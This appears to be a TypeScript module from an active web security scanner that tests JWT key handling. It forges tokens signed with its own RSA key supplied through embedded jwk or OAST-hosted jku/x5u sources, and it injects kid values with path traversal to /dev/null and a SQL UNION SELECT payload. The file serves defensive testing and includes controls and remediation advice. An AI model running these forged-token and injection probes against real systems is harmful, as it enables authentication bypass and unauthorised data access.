import type { ScanCheck, ScanCheckContext, Exchange, OastProbe } from "./types";
import { decodeJwtPart, encodeJwtPart } from "./token-graphql-checks";
import { withoutCredentials } from "./http-checks";
import { withHeader } from "./parameters";
import { base64url, selfSignedCertificate } from "./rsa-material";
import { compareResponses } from "../response-diff";
import { ok, text, result, observation } from "./extended-checks";
const denied = (x: Exchange) => ok(x) && [401, 403].includes(x.response!.status);
function same(a: Exchange, b: Exchange, ctx: ScanCheckContext) {
  if (!ok(a) || !ok(b) || a.response!.status < 200 || a.response!.status >= 300 || !text(a).trim())
    return false;
  const d = compareResponses(a.response!, b.response!, ctx.diffOptions);
  return !d.statusChanged && !d.bodyChanged;
}
async function setup(ctx: ScanCheckContext, kind: "rsa" | "hmac") {
  if (
    !globalThis.crypto?.subtle ||
    !ctx.stable ||
    ctx.baselines.length < 2 ||
    !ctx.baselines.every(
      (x) => ok(x) && x.response!.status >= 200 && x.response!.status < 300 && text(x).trim(),
    )
  )
    return undefined;
  const token = Object.entries(ctx.request.headers)
    .find(([k]) => k.toLowerCase() === "authorization")?.[1]
    .match(/^Bearer ([\w-]+\.[\w-]+\.[\w-]+)$/i)?.[1];
  if (!token || token.length > 24000) return undefined;
  let header: Record<string, unknown>;
  const [head, payload, signature] = token.split(".") as [string, string, string];
  try {
    header = decodeJwtPart(head);
    decodeJwtPart(payload);
  } catch {
    return undefined;
  }
  if (
    kind === "rsa"
      ? header["alg"] !== "RS256"
      : typeof header["alg"] !== "string" || !/^HS(?:256|384|512)$/.test(header["alg"] as string)
  )
    return undefined;
  const clean = withoutCredentials(ctx.request).request;
  const send = (value: string, label: string) =>
    ctx.probe(withHeader(clean, "Authorization", `Bearer ${value}`), label);
  const original = await send(token, "JWT key-source isolated original");
  const anonymous = await ctx.probe(clean, "JWT key-source anonymous control");
  const malformed = await send(ctx.nonce(), "JWT key-source malformed control");
  const invalid = await send(
    `${head}.${payload}.${signature[0] === "A" ? "B" : "A"}${signature.slice(1)}`,
    "JWT key-source invalid signature control",
  );
  if (!same(original, ctx.baselines[0]!, ctx) || ![anonymous, malformed, invalid].every(denied))
    return undefined;
  return {
    token,
    header,
    payload,
    send,
    original,
    rows: [...ctx.baselines, original, anonymous, malformed, invalid],
  };
}
async function keySource(ctx: ScanCheckContext, mode: "jwk" | "jku" | "x5u") {
  const state = await setup(ctx, "rsa");
  if (!state || state.header["alg"] !== "RS256")
    return result(
      "RS256 Bearer JWT with stable protected response and denied controls required.",
      true,
    );
  if (mode !== "jwk" && !ctx.oast?.publishKey)
    return result("Reachable OAST collector with public-key hosting required.", true);
  const pair = await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"],
  );
  const exported = await crypto.subtle.exportKey("jwk", pair.publicKey);
  const kid = ctx.nonce();
  const jwk = { kty: "RSA", n: exported.n!, e: exported.e!, kid, use: "sig", alg: "RS256" };
  const material =
    mode === "x5u"
      ? { kind: "certificate" as const, body: await selfSignedCertificate(pair) }
      : { kind: "jwks" as const, body: JSON.stringify({ keys: [jwk] }) };
  const header = { ...state.header, kid };
  for (const key of ["jwk", "jku", "x5u", "x5c"]) delete (header as Record<string, unknown>)[key];
  const sign = async (h: Record<string, unknown>) => {
    const input = `${encodeJwtPart(h)}.${state.payload}`;
    return `${input}.${base64url(await crypto.subtle.sign("RSASSA-PKCS1-v1_5", pair.privateKey, new TextEncoder().encode(input)))}`;
  };
  const noSource = await state.send(
    await sign(header),
    "JWT attacker key without key-source control",
  );
  if (!denied(noSource))
    return result(
      "Attacker key accepted without source; key-source trust cannot be attributed.",
      true,
    );
  const rows: Exchange[] = [noSource];
  const hosted: OastProbe[] = [];
  const unused = mode !== "jwk" ? await ctx.oast!.issue() : undefined;
  for (let i = 0; i < 2; i++) {
    const source = mode === "jwk" ? undefined : await ctx.oast!.publishKey!(material);
    if (source) hosted.push(source);
    const h = { ...header, slurp_probe: ctx.nonce(), [mode]: mode === "jwk" ? jwk : source!.url };
    const signed = await sign(h);
    const parts = signed.split(".");
    const bad = `${parts[0]}.${parts[1]}.${parts[2]![0] === "A" ? "B" : "A"}${parts[2]!.slice(1)}`;
    const negative = await state.send(bad, `JWT ${mode} wrong-signature control`);
    const probe = await state.send(signed, `JWT attacker-controlled ${mode} ${i + 1}`);
    rows.push(negative, probe);
    if (!denied(negative) || !same(probe, state.original, ctx))
      return result(
        `No controlled ${mode} key-source acceptance reproduced.`,
        !ok(negative) || !ok(probe),
      );
    if (source) {
      const observed = await ctx.oast!.poll(source, probe);
      if (!observed.events.some((e) => e.protocol === "http"))
        return result(
          "JWT accepted but no HTTP key retrieval was correlated; source attribution inconclusive.",
          true,
        );
    }
  }
  if (unused && (await ctx.oast!.poll(unused, rows.at(-1))).events.length)
    return result("Unsubmitted OAST control received callbacks; attribution failed.", true);
  const restored = await state.send(state.token, "JWT key-source original restore");
  if (!same(restored, state.original, ctx))
    return result("Original authenticated response was not restored.", true);
  const out = observation(
    `JWT accepts attacker-controlled ${mode} signing key`,
    "Two independently signed attacker-key tokens reproduced the protected response. Anonymous, malformed, invalid-original-signature, wrong-attacker-signature and missing-key-source controls were denied; the original JWT restored the response. Claims were unchanged. Remote key sources additionally required correlated HTTP callbacks and a silent unsubmitted control. Review the protected data and intended trust policy; role escalation was not tested.",
    [...state.rows, ...rows, restored],
    [`Source: ${mode}`, ...hosted.map((p) => `Hosted public key: ${p.url}`)],
    "high",
  );
  out.findings[0]!.remediation =
    "Resolve signing keys only from server-configured trusted issuers and key sets. Do not trust token-supplied jwk, jku or x5u; pin algorithms and validate key-source policy.";
  return out;
}
async function kidCheck(ctx: ScanCheckContext) {
  const state = await setup(ctx, "hmac");
  const alg = state?.header["alg"];
  if (!state || typeof alg !== "string" || !/^HS(?:256|384|512)$/.test(alg))
    return result("HS256/384/512 protected Bearer JWT required for kid key-lookup tests.", true);
  const sign = async (header: Record<string, unknown>, secret: Uint8Array<ArrayBuffer>) => {
    const key = await crypto.subtle.importKey(
      "raw",
      secret,
      { name: "HMAC", hash: `SHA-${alg.slice(2)}` },
      false,
      ["sign"],
    );
    const input = `${encodeJwtPart(header)}.${state.payload}`;
    return `${input}.${base64url(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(input)))}`;
  };
  for (const family of ["null-file", "sql-key-selection"] as const) {
    const rows: Exchange[] = [];
    for (let i = 0; i < 2; i++) {
      const nonce = ctx.nonce().replace(/[^a-zA-Z0-9]/g, "");
      const secret = family === "null-file" ? Uint8Array.of(0) : new TextEncoder().encode(nonce);
      const kid =
        family === "null-file"
          ? i
            ? "../../../../../../dev/null"
            : "../../../../dev/null"
          : `slurp' UNION SELECT '${nonce}'-- `;
      const clean = { ...state.header };
      for (const key of ["jwk", "jku", "x5u", "x5c"]) delete clean[key];
      const negative = await state.send(
        await sign({ ...clean, kid: `slurp-missing-${nonce}` }, secret),
        "JWT kid missing-key control",
      );
      const signed = await sign({ ...clean, kid, slurp_probe: nonce }, secret);
      const parts = signed.split(".");
      const wrong = await state.send(
        `${parts[0]}.${parts[1]}.${parts[2]![0] === "A" ? "B" : "A"}${parts[2]!.slice(1)}`,
        "JWT kid wrong-signature control",
      );
      const probe = await state.send(signed, `JWT kid ${family} ${i + 1}`);
      rows.push(negative, wrong, probe);
      if (!denied(negative) || !denied(wrong) || !same(probe, state.original, ctx)) break;
    }
    if (
      rows.length !== 6 ||
      ![rows[0], rows[1], rows[3], rows[4]].every((x) => denied(x!)) ||
      ![rows[2], rows[5]].every((x) => same(x!, state.original, ctx))
    )
      continue;
    const restore = await state.send(state.token, "JWT kid original restore");
    if (!same(restore, state.original, ctx))
      return result("Original JWT did not restore baseline.", true);
    return observation(
      `Possible JWT kid ${family} key-lookup bypass`,
      "Two HMAC tokens with controlled key-lookup identifiers reproduced the protected response while missing-key, anonymous, malformed and invalid-original-signature controls were denied. The original JWT restored the response. Claims were unchanged; review key-loader behavior and protected-data access. Null-file probes use the HMAC empty-key equivalent and SQL probes use only a generated literal SELECT, without writes.",
      [...state.rows, ...rows, restore],
      [`Lookup family: ${family}`],
      "high",
    );
  }
  return result(
    "No controlled kid null-file or SQL literal key-selection bypass reproduced. Other key stores and payload contexts remain untested.",
  );
}
export const jwtKeyChecks: ScanCheck[] = [
  {
    id: "jwt-jwk",
    name: "JWT embedded jwk key trust",
    active: true,
    perParameter: false,
    run: (ctx) => keySource(ctx, "jwk"),
  },
  {
    id: "jwt-jku",
    name: "JWT remote jku key trust",
    active: true,
    perParameter: false,
    run: (ctx) => keySource(ctx, "jku"),
  },
  {
    id: "jwt-x5u",
    name: "JWT remote x5u certificate trust",
    active: true,
    perParameter: false,
    run: (ctx) => keySource(ctx, "x5u"),
  },
  {
    id: "jwt-kid",
    name: "JWT kid key-lookup injection",
    active: true,
    perParameter: false,
    run: kidCheck,
  },
];
